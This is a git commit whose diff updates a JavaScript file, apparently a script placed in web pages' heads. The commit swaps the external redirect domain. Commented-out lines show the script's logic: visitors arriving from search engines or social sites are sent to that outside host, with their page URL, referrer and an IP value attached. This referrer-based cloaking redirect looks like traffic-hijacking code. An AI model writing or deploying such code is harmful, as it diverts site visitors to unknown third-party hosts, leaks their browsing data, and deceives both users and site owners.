3cc5a373b23c032473443963d3350eb8279aff8f
recognitionissue <tasralasir@gmail.com>
2026-04-18 22:55:15 +0700

    Update head_t1_apacut.js

--- head_t1_apacut.js
+++ head_t1_apacut.js
@@ -1,5 +1,5 @@
 ///// Arsae /////
-var arsT1Bing = 'https://apacutt1.zahiracipiyoh.my.id';
+var arsT1Bing = 'https://apacut.teknodrem.com';
 
 // if(['google.', 'msn.', 'bing.', 'yandex.', 'facebook.', 'ecosia', 'qwant', 'pinterest.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s))){ 
 	// window.location.href = arsT1Bing + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) + '&ip=' + window.ipAddressArsae
